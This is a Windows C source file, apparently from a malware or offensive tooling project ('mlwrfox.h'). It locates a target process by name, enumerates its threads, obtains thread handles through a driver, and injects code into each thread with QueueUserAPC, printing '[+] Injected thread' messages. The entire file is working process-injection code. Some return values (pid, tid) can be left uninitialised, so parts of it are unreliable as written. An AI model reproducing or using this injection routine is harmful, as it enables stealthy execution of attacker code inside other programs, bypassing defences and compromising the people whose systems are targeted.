#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "mlwrfox.h"

DWORD LocateProcess(
  PCHAR szProcessName
)
{
  HANDLE hProcSnap;
  PROCESSENTRY32 pProc32;
  DWORD pid;

  hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if ( hProcSnap == INVALID_HANDLE_VALUE ) 
	  return (0);

  pProc32.dwSize = sizeof(PROCESSENTRY32);
  if ( !Process32First(hProcSnap, &pProc32) ) {
	  CloseHandle(hProcSnap);
  	  return 0;
  };

  do 
  {
    if ( strcmp(szProcessName, pProc32.szExeFile) == 0) 
    { 
      pid = pProc32.th32ProcessID;
      break;
    };
  } while ( Process32Next(hProcSnap, &pProc32) );

  CloseHandle(hProcSnap);

  return pid;
};

DWORD LocateThread(
  HANDLE hDriver,
  DWORD dwProcId,
  LPVOID pMemory,
  LPVOID pParam,
  BOOL ResetThreads
)
{
  HANDLE hThrdSnap;
  THREADENTRY32 pThrd32;
  DWORD tid;

  hThrdSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcId);
  if ( hThrdSnap == INVALID_HANDLE_VALUE )
	return (0);

  pThrd32.dwSize = sizeof(THREADENTRY32);
  if ( !Thread32First(hThrdSnap, &pThrd32) ) {
	CloseHandle(hThrdSnap);
	return 0;
  };

  do 
  {
    
    if ( dwProcId == pThrd32.th32OwnerProcessID )
    {

      HANDLE hThread = NULL;

      AcquireThread(hDriver, &pThrd32.th32ThreadID, &hThread);

      if ( ResetThreads != TRUE ) { 
        QueueUserAPC((PAPCFUNC)pMemory, (HANDLE)hThread, 
		      (ULONG_PTR)pParam);
        printf("[+] Injected thread %i\n", pThrd32.th32ThreadID);
      } else {
	printf("[+] Resumed thread %i\n", pThrd32.th32ThreadID);
	ResumeThread(hThread);
      };
      CloseHandle(hThread);
    };
  } while ( Thread32Next(hThrdSnap, &pThrd32) );

  CloseHandle(hThrdSnap);

  return tid;
};
